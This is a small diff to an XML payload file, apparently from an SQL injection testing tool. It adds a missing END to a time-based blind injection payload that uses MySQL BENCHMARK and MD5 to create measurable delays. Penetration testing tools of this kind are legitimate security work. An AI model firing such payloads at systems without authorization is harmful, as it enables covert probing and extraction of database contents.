@@ -1626,9 +1626,9 @@
         <risk>2</risk>
         <clause>1,2,3,9</clause>
         <where>3</where>
-        <vector>(CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM])</vector>
+        <vector>(CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM])</payload>
+            <payload>(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM] END)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
